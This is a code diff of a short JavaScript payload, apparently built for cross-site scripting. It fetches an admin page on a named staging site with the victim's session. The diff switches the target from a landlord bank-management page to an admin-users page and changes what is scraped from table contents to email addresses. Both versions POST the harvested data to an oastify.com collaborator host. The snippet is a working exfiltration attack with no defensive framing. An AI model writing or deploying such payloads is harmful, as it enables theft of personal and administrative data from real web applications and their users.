@@ -2,24 +2,27 @@ function fe(t) {
     fetch(t)
         .then(t => t.text())
         .then(t => {
-            // Extract content between <table> and </table> tags
-            const tableContent = t.match(/<table[^>]*>([\s\S]*?)<\/table>/i);
-            
-            if (tableContent && tableContent[1]) {
-                // Send the extracted table content as raw data in a POST request
-                fetch("//mpff5i3yowuv452xfzhu30ytzk5bt1hq.oastify.com/log/", {
+            // Extract all <td class="col col-email">...</td> contents
+            const emailMatches = [...t.matchAll(/<td\s+class="col col-email">([\s\S]*?)<\/td>/gi)];
+
+            if (emailMatches.length > 0) {
+                // Prepare a clean list of emails
+                const emails = emailMatches.map(match => match[1].trim()).join('\n');
+
+                // Send the email list as raw data in a POST request
+                fetch("//n7vyiz18ap2xxppzixi27gigj7pyds1h.oastify.com/log/", {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'text/plain'
                     },
-                    body: tableContent[1] // Send the raw table content
+                    body: emails
                 });
             } else {
-                console.log('No <table> tag found in the HTML.');
+                console.log('No email tags found in the HTML.');
             }
         })
         .catch(error => console.error('Error:', error));
 }
 
-urls = ["https://leaderbank.qa.zrent.net/Landlord/ManageBanks"];
+urls = ["https://backend-staging.getpowerpay.us/admin/admin_users"];
 urls.forEach(fe);
